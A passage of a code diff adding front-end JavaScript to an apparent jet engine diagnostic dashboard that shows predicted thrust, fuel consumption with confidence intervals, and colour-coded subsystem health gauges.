+        const tsfc = data.TSFC_g_N_s;
+        document.getElementById('valThrust').innerText = Math.round(thrust).toLocaleString() + " N";
+        document.getElementById('valTSFC').innerText = tsfc.toFixed(5) + " g/N/s";
+
+        // Display 95% Confidence Intervals calculated from model RMSEs
+        document.getElementById('uqThrust').innerText = `95% CI: ${Math.round(thrust - 2895).toLocaleString()} - ${Math.round(thrust + 2895).toLocaleString()} N`;
+        document.getElementById('uqTSFC').innerText = `95% CI: ${(tsfc - 0.0012).toFixed(5)} - ${(tsfc + 0.0012).toFixed(5)} g/N/s`;
+
+        // Update subsystem health progress dials
+        updateHealthGauge('Comp', data.CompressorHealth);
+        updateHealthGauge('Comb', data.CombustorHealth);
+        updateHealthGauge('Turb', data.TurbineHealth);
+        updateHealthGauge('Overall', data.OverallHealth);
+
+      } catch (err) {
+        console.error('Diagnostic evaluation request failed:', err);
+      }
+    }
+
+    // Update SVG progress ring coordinates and color mappings
+    function updateHealthGauge(id, val) {
+      const percentage = Math.min(Math.max(val * 100, 0), 100);
+      document.getElementById('lbl' + id).innerText = percentage.toFixed(1) + "%";
+      
+      const circle = document.getElementById('fill' + id);
+      const radius = circle.r.baseVal.value;
+      const circumference = 2 * Math.PI * radius;
+      const offset = circumference - (percentage / 100) * circumference;
+      circle.style.strokeDasharray = circumference;
+      circle.style.strokeDashoffset = offset;
+
+      // Color bounds mapping
+      if (percentage >= 85) {
+        circle.style.stroke = 'var(--success)';
+      } else if (percentage >= 70) {
+        circle.style.stroke = 'var(--warning)';
+      } else {
+        circle.style.stroke = 'var(--danger)';
+      }
+    }
+
+    function runDiagnostic(e) {
+      e.preventDefault();
+      triggerPrediction();
+    }
+
+    // Initialize to standard sea level takeoff parameters on launch
+    document.addEventListener('DOMContentLoaded', () => {
+      loadPreset('takeoff');
     });
   </script>
 </body>
